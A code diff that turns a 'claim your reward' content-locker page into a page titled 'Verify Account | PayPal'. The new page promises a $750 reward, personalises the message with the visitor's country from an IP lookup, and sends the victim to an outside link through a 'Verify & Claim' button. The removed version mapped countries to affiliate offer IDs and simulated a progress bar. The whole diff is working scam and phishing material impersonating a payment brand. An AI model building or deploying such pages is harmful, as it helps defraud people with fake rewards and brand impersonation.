@@ -3,98 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Your Reward | Complete Offers</title>
+    <title>Verify Account | PayPal</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .progress-bar-fill { transition: width 0.5s ease-in-out; }
-    </style>
 </head>
-<body class="bg-gray-100 text-gray-900">
+<body class="bg-gray-100 p-4">
 
-    <div class="min-h-screen flex flex-col items-center p-4">
-        <header class="w-full max-w-4xl text-center py-6">
-            <h1 class="text-3xl font-bold text-gray-800">Final Step: Claim Your Reward</h1>
-            <p class="text-gray-600 mt-2">Complete <span class="font-bold text-blue-600">3 offers</span> below to unlock your reward instantly.</p>
-        </header>
+    <div class="max-w-2xl mx-auto bg-white p-6 rounded-xl shadow-lg mt-10 text-center">
+        <h2 class="text-2xl font-bold mb-4">Complete Final Verification</h2>
+        <p class="text-gray-600 mb-6">
+            To unlock your $<span id="amount">750</span> reward for users in <span id="country-name" class="font-bold">Loading...</span>, please complete the offers below.
+        </p>
 
-        <div class="w-full max-w-2xl bg-white p-6 rounded-lg shadow-md mb-8">
-            <div class="flex justify-between mb-2">
-                <span class="text-sm font-semibold text-gray-700">Completion Progress</span>
-                <span id="progress-text" class="text-sm font-bold text-blue-600">0/3</span>
-            </div>
-            <div class="w-full bg-gray-200 rounded-full h-4">
-                <div id="progress-bar" class="progress-bar-fill bg-blue-500 h-4 rounded-full" style="width: 0%"></div>
-            </div>
-        </div>
-
-        <div class="w-full max-w-4xl grid grid-cols-1 md:grid-cols-2 gap-6">
-            <div class="bg-white p-6 rounded-lg shadow hover:shadow-lg transition">
-                <h3 class="text-xl font-semibold mb-2">Exclusive Survey</h3>
-                <p class="text-gray-600 mb-4">Complete this quick survey to earn credit.</p>
-                <a href="#" target="_blank" class="start-offer-btn block w-full bg-green-500 text-white text-center py-3 rounded font-bold hover:bg-green-600">
-                    START OFFER
-                </a>
-            </div>
-            <div class="bg-white p-6 rounded-lg shadow hover:shadow-lg transition">
-                <h3 class="text-xl font-semibold mb-2">App Install Task</h3>
-                <p class="text-gray-600 mb-4">Download and open this app to earn credit.</p>
-                <a href="#" target="_blank" class="start-offer-btn block w-full bg-green-500 text-white text-center py-3 rounded font-bold hover:bg-green-600">
-                    START OFFER
-                </a>
-            </div>
-        </div>
+        <a href="https://confirmapp.store/sl/yz23d" target="_blank" 
+           class="block w-full bg-green-500 text-white font-bold py-4 rounded-lg text-lg hover:bg-green-600">
+            Verify & Claim
+        </a>
     </div>
 
     <script>
-        // 1. YOUR COUNTRY -> OFFER ID MAPPING
-        const countryOfferMap = {
-            'US': '59475', 'GB': '71159', 'CA': '71027', 'NZ': '71159',
-            'CH': '70935', 'DE': '67782', 'KR': '66501', 'ZA': '65372',
-            'TH': '64660', 'VN': '64411', 'IE': '62394', 'PL': '61578',
-            'DK': '61352', 'FR': '61577', 'MX': '61408', 'GR': '61240'
-        };
-
-        // 2. Setup Offer Links based on Country
-        async function setOfferLinks() {
-            try {
-                // Get country code via API
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                const country = data.country;
-                
-                const offerId = countryOfferMap[country] || '59475'; // Default to US if not found
-                
-                // --- UPDATE THIS URL TO YOUR OGADS SMARTLINK ---
-                const baseLink = `https://your-ogads-smartlink.com/?id=${offerId}`;
-                
-                document.querySelectorAll('.start-offer-btn').forEach(btn => {
-                    btn.href = baseLink;
-                });
-                console.log(`Country: ${country}, OfferID: ${offerId}`);
-            } catch (e) {
-                console.error("Error setting offer links", e);
-            }
-        }
-
-        // 3. Update Progress Bar based on Postback
-        function updateProgress() {
-            // This function would ideally poll your postback.php or 
-            // a file it generates to see how many leads are recorded.
-            // For this example, we simulate checking local storage.
-            let completed = localStorage.getItem('completedOffers') || 0;
-            
-            const totalRequired = 3;
-            const percentage = (completed / totalRequired) * 100;
-
-            document.getElementById('progress-bar').style.width = `${percentage}%`;
-            document.getElementById('progress-text').textContent = `${completed}/${totalRequired}`;
-        }
-
-        // Initialize
-        setOfferLinks();
-        updateProgress();
-        // Poll for updates every 10 seconds
-        setInterval(updateProgress, 10000); 
+        // Re-detect country here to keep the message consistent
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('country-name').textContent = data.country_name;
+            })
+            .catch(error => {
+                document.getElementById('country-name').textContent = "your country";
+            });
     </script>
 </body>
 </html>
